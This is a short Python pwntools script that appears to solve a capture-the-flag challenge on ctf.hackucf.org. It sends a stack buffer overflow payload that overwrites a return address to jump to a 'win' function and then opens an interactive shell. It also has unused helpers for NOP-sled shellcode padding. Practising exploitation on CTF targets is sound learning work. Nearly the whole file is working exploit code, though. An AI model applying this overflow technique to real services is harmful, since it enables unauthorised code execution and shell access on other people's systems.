from pwn import *

def pad_payload(pad_content, payload, buffer_size, return_address):
    pad_size = buffer_size - len(payload) - len(return_address)
    return pad_content * pad_size + payload + return_address

def pad_with_nop(payload, buffer_size, return_address):
    return pad_payload(NOP, payload, buffer_size, return_address)

def exploit(buf_size, return_address):
    return pad_with_nop(shellcode, buf_size, return_address)

local=False


if local:
    sh = process('./ret')

else:
    sh=remote("ctf.hackucf.org",9003)

win_addr = p32(0x804861b)
deadbeef = p32(0xdeadbeef)

pre_padding = "A" * 64
payload = pre_padding + deadbeef # win_addr
pos_padding = "B" * 12
payload += pos_padding + win_addr

sh.sendline(payload)
#print(sh.recv())

# when we get a shell
sh.interactive()
